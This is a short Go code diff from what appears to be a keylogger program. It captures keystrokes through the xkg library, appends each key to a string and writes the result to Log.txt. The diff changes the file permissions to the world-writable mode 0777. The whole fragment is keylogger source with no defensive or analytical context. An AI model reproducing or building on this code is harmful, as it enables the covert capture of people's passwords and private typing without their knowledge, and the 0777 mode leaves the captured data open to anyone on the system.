@@ -16,7 +16,7 @@ func main() {
 
         if key, ok := xkg.KeyMap[keycode]; ok {
             armazenar += key
-            ioutil.WriteFile("Log.txt", []byte(armazenar), 667)
+            ioutil.WriteFile("Log.txt", []byte(armazenar), 0777)
         }
        
     }
